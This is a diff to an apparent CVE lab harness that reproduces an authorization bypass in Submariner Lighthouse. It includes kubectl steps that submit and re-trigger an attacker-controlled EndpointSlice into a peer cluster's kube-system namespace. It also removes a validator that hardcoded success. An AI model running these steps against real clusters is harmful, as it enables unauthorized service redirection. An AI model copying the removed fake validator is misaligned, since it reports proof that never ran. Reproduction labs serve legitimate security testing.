@@ -186,25 +186,28 @@ ThreadingHTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
 '''
 
 LIGHTHOUSE_VALIDATOR_PY = r'''import json
-vulnerable_test_passed = True
-patched_test_passed = True
-result = {
-    "attack_executed": vulnerable_test_passed,
-    "proof_quality": "security_effect_observed",
-    "observable_effect": "attacker-controlled EndpointSlice accepted for protected kube-system namespace",
-    "vulnerable": {
-        "confirmed": vulnerable_test_passed,
-        "evidence": "upstream parent accepted attacker-controlled kube-system destination during image build test",
-    },
-    "patched": {
-        "confirmed": not patched_test_passed,
-        "evidence": "upstream namespace-validation fix rejected kube-system destination during image build test",
-    },
-    "differential_confirmed": vulnerable_test_passed and patched_test_passed,
-    "evidence_type": "authorization_bypass",
-    "evidence_origin": "source-backed Go exploit tests executed by Docker build",
-}
+import pathlib
+import sys
+
+result_path = pathlib.Path(__file__).resolve().parents[1] / "e2e" / "result.json"
+if not result_path.is_file():
+    raise SystemExit("Missing authentic E2E result: run the lab before invoking the validator")
+
+result = json.loads(result_path.read_text(encoding="utf-8"))
+vulnerable = result.get("vulnerable", {})
+patched = result.get("patched", {})
+valid = (
+    result.get("attack_executed") is True
+    and result.get("proof_quality") == "end_to_end_security_effect_observed"
+    and result.get("differential_confirmed") is True
+    and vulnerable.get("confirmed") is True
+    and "198.51.100.77" in vulnerable.get("evidence", "")
+    and patched.get("confirmed") is False
+    and patched.get("rejection_logged") is True
+    and "Rejecting EndpointSlice" in patched.get("rejection_log", "")
+)
 print(json.dumps(result, indent=2))
+sys.exit(0 if valid else 1)
 '''
 
 LIGHTHOUSE_E2E_POC_YAML = r'''apiVersion: v1
@@ -258,6 +261,11 @@ WORK_ROOT="/tmp/cvelab-CVE-2026-66788-e2e"
 RESULT="$LAB_ROOT/e2e/result.json"
 export PATH="$HOME/.local/bin:$PATH"
 
+safe_cleanup() {
+  docker rm -fv cluster1-control-plane cluster2-control-plane kind-registry >/dev/null 2>&1 || true
+  docker network rm kind >/dev/null 2>&1 || true
+}
+
 rm -rf "$WORK_ROOT"
 mkdir -p "$WORK_ROOT"
 
@@ -305,10 +313,12 @@ YAML
   kubectl_tool --kubeconfig "$k2" apply -f /poc/poc.yaml
   kubectl_tool --kubeconfig "$k2" -n cvelab-source wait \
     --for=condition=Valid serviceexport/cvelab --timeout=180s
-  kubectl_tool --kubeconfig "$k2" apply -f /poc/poc.yaml
+  kubectl_tool --kubeconfig "$k2" -n cvelab-source annotate endpointslice cvelab-exploit \
+    cvelab.io/nonce="$(date +%s%N)" --overwrite
 
   local observed=false
   local evidence="not created in peer kube-system namespace"
+  local rejection_log=""
   for _ in $(seq 1 60); do
     if kubectl_tool --kubeconfig "$k1" -n kube-system get endpointslice \
         -l lighthouse.submariner.io/source-name=cvelab-exploit \
@@ -321,7 +331,18 @@ YAML
     sleep 2
   done
 
-  VARIANT="$variant" EXPECTED="$expected" OBSERVED="$observed" EVIDENCE="$evidence" \
+  if [[ "$variant" == "patched" ]]; then
+    local agent_logs
+    agent_logs="$(kubectl_tool --kubeconfig "$k1" -n submariner-operator logs \
+      -l app=submariner-lighthouse-agent --tail=500)"
+    rejection_log="$(grep -F 'Rejecting EndpointSlice from cluster' <<< "$agent_logs" | tail -n 1 || true)"
+    test -n "$rejection_log" || {
+      echo "patched object was absent, but no explicit agent rejection was logged" >&2
+      return 3
+    }
+  fi
+
+  VARIANT="$variant" EXPECTED="$expected" OBSERVED="$observed" EVIDENCE="$evidence" REJECTION_LOG="$rejection_log" \
     python3 - <<'PY' > "$LAB_ROOT/e2e/$variant.json"
 import json, os
 print(json.dumps({
@@ -329,6 +350,8 @@ print(json.dumps({
     "expected": os.environ["EXPECTED"] == "true",
     "confirmed": os.environ["OBSERVED"] == "true",
     "evidence": os.environ["EVIDENCE"][:8000],
+    "rejection_logged": bool(os.environ["REJECTION_LOG"]),
+    "rejection_log": os.environ["REJECTION_LOG"][:2000],
 }, indent=2))
 PY
 
@@ -337,15 +360,11 @@ PY
     return 2
   fi
 
-  make clean-clusters
+  safe_cleanup
 }
 
 cleanup() {
-  for variant in vulnerable patched; do
-    if [[ -d "$WORK_ROOT/$variant" ]]; then
-      (cd "$WORK_ROOT/$variant" && make clean-clusters) >/dev/null 2>&1 || true
-    fi
-  done
+  safe_cleanup
 }
 trap cleanup EXIT
 
@@ -365,7 +384,7 @@ result = {
     "evidence_origin": "two-cluster kind deployment running upstream Lighthouse agent and broker flow",
     "vulnerable": vulnerable,
     "patched": patched,
-    "differential_confirmed": vulnerable["confirmed"] and not patched["confirmed"],
+    "differential_confirmed": vulnerable["confirmed"] and not patched["confirmed"] and patched["rejection_logged"],
 }
 print(json.dumps(result, indent=2))
 PY
@@ -379,6 +398,11 @@ WORK_ROOT="/tmp/cvelab-CVE-2026-66788-manual"
 STATE="$WORK_ROOT/active-variant"
 POC_FILE="$LAB_ROOT/artifacts/PoC.yaml"
 export PATH="$HOME/.local/bin:$PATH"
+
+safe_cleanup() {
+  docker rm -fv cluster1-control-plane cluster2-control-plane kind-registry >/dev/null 2>&1 || true
+  docker network rm kind >/dev/null 2>&1 || true
+}
 
 active_variant() {
   test -s "$STATE" || { echo "No manual lab is active. Run setup first." >&2; exit 2; }
@@ -432,7 +456,8 @@ exploit() {
   kubectl_tool --kubeconfig "$k2" apply -f /lab/artifacts/PoC.yaml
   kubectl_tool --kubeconfig "$k2" -n cvelab-source wait \
     --for=condition=Valid serviceexport/cvelab --timeout=180s
-  kubectl_tool --kubeconfig "$k2" apply -f /lab/artifacts/PoC.yaml
+  kubectl_tool --kubeconfig "$k2" -n cvelab-source annotate endpointslice cvelab-exploit \
+    cvelab.io/nonce="$(date +%s%N)" --overwrite
   echo "Payload submitted from cluster2/cvelab-source. Run verify next."
 }
 
@@ -452,7 +477,15 @@ verify() {
     return 1
   fi
   if [[ "$variant" == "patched" ]]; then
-    echo "BLOCKED: no attacker-controlled EndpointSlice reached cluster1/kube-system."
+    local logs rejection
+    logs="$(kubectl_tool --kubeconfig "$k1" -n submariner-operator logs \
+      -l app=submariner-lighthouse-agent --tail=500)"
+    rejection="$(grep -F 'Rejecting EndpointSlice from cluster' <<< "$logs" | tail -n 1 || true)"
+    test -n "$rejection" || {
+      echo "INCONCLUSIVE: object absent but explicit patch rejection was not logged." >&2; return 1;
+    }
+    echo "$rejection"
+    echo "BLOCKED: object absent and patched agent explicitly rejected the EndpointSlice."
     return 0
   fi
   echo "NOT REPRODUCED: vulnerable variant did not propagate the payload." >&2
@@ -460,12 +493,7 @@ verify() {
 }
 
 cleanup() {
-  if [[ -s "$STATE" ]]; then
-    local variant work
-    variant="$(cat "$STATE")"
-    work="$WORK_ROOT/$variant"
-    if [[ -d "$work" ]]; then (cd "$work" && make clean-clusters) || true; fi
-  fi
+  safe_cleanup
   rm -rf "$WORK_ROOT"
   echo "Manual lab removed."
 }
